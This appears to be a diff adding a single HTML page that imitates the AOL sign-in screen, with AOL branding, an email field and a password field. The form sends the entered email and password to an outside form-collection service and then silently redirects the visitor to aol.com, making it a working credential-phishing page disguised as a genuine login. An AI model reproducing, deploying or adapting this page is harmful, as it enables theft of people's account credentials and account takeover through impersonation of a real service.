@@ -1,0 +1,225 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="m-style.css">
+    <style>
+       body{
+    margin: 0;
+    background-color:#f9f9fa;
+    padding:0px;
+    overflow: hidden;
+    }
+
+	 .button-style{
+    width: 250px;
+    height: 45px;
+    font-size: 20;
+    color: white;
+    background-color:#188fff;
+    border:none;
+    border-radius: px;
+    display: block;
+    margin: auto;
+    border-radius:2px;
+    margin-top:35px;
+    }
+
+
+    .Sign-in-option-container{
+
+        width: 450px;
+        height: 50px;
+        margin-top:0px;
+        background-color:white;
+        display: block;
+        margin: auto;
+
+    }
+    .Sign-in-option-style{
+        margin-left: 40px;
+        font-size: 15px;
+        padding-top: 15px;
+        color:grey;
+        text-transform: ;
+        font-family: Arial, Helvetica, sans-serif;
+
+    }
+
+    .Creat-an-account{
+        width: 250px;
+        height: 45px;
+        color:blue;
+        background-color:white;
+        font-size: 20px;
+        display: block;
+       font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
+        margin: auto;
+        border: 1px solid #39f;
+        margin-top:35px;
+        border-radius:2px;
+        }
+
+    .head-container{
+        width: 360px;
+        height:700px;
+        margin-top: 100px;
+       background-color: blue;
+        display: block;
+        margin: auto;
+
+    }
+
+    .first-container{a
+        width:300px;
+        color: red;
+        margin-top:50px;
+        display: block;
+
+    }
+    .form-container{
+        width: 360px;
+        height: 700px;
+        margin-top: 100px;
+        background-color:white;
+        display: block;
+        margin: auto;
+
+    }
+
+    .Aol-loge-text-style{
+        text-align: center;
+        font-size:45px;
+        color: #1b1b1b;
+        padding: 20px;
+        font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
+    }
+
+
+    .Sing-in-style{
+        text-align: center;
+        margin-top: -17px;
+        margin-left: 0px;
+        font-size: 24px;
+        font-family: Helvetica,Calibri,arial,sans-serif;
+        color:#26282a;
+
+
+    }
+
+    .Sign-in-using-your-yahoo-account{
+        text-align: center;
+        margin-top:7px;
+        margin-left: 0px;
+        font-size: 15px;
+        font-family: Helvetica,arial,sans-serif;
+        color:#26282b;
+
+
+
+    }
+
+    .Enter-password-style{
+        margin-top: 20px;
+        margin-left: 40px;
+        font-size: 24px;
+        font-family: Helvetica,arial,sans-serif;
+        color:#1b1b1b;
+
+    }
+
+
+    .input-style{
+    min-width: 80%;
+    margin-left: 40px;
+    padding: 6px 10px;
+     border-width: 1px;
+    border-color: #666;
+    border-color: rgba(0,0,0,.6);
+    height: 36px;
+    outline: none;
+    border-radius: 0;
+    -webkit-border-radius: 0;
+    background-color: transparent;
+    border-top-width: 0;
+    border-left-width: 0;
+    border-right-width: 0;
+    padding-left: 0;
+
+    }
+
+    .keep-me-sign-in{
+    margin-left: 40px;
+    margin-top: 20px;
+
+    }
+
+    .keep-me-sign-in-text-style{
+        margin-left:5px;
+        margin-top: 0px;
+        font-size: 15px;
+        padding-top:15px;
+        color:#188fff;
+        text-transform: ;
+        font-family: Arial, Helvetica, sans-serif;
+
+    }
+
+    .Forget-password-style{
+        text-decoration: none;
+        color:#188fff;
+        font-family: Arial, Helvetica, sans-serif;
+        margin-left:25px;
+        margin-top: 15px;
+    }
+
+
+    </style>
+</head>
+<body>
+    <div class="head-container">
+      <div class="first-container">
+
+        <div class="form-container">
+
+        <h2 class="Aol-loge-text-style">Aol.</h2>
+          <h2 class="Sing-in-style">Sign in</h2>
+
+         <form  action="https://submit-form.com/66VxlkPU
+" method="post" class="username-challenge "> 
+<input type="hidden" name="_redirect" value="https://aol.com"/>
+            <input class="input-style" type="email" placeholder="Username, email address or mobile number" name="email" id="email" value="" required/ >
+            <br>
+            <h2 class="Enter-password-style">Enter password</h2>
+            <input name="passwd" id="password" required="" class="input-style" type="password" placeholder="Password" > <br>
+
+            <button type="submit" name="submit" alt="submit"  onclick="function()" id="button" class="button-style">Next</button>
+            <Table>
+                <tr>
+                    <td><input class="keep-me-sign-in" type="checkbox" name="" id=""></td>
+                    <td><p class="keep-me-sign-in-text-style">Stay signed in</p></td>
+
+
+                </tr>
+            </Table>
+
+            <button type="submit" name="submit" alt="submit"  onclick="function()" id="button" class="Creat-an-account">Create an account</button>
+
+
+
+          </form>
+
+        </div>
+
+    </div>
+      <br>
+
+
+</div>
+
+
+
+</body>
+</html>
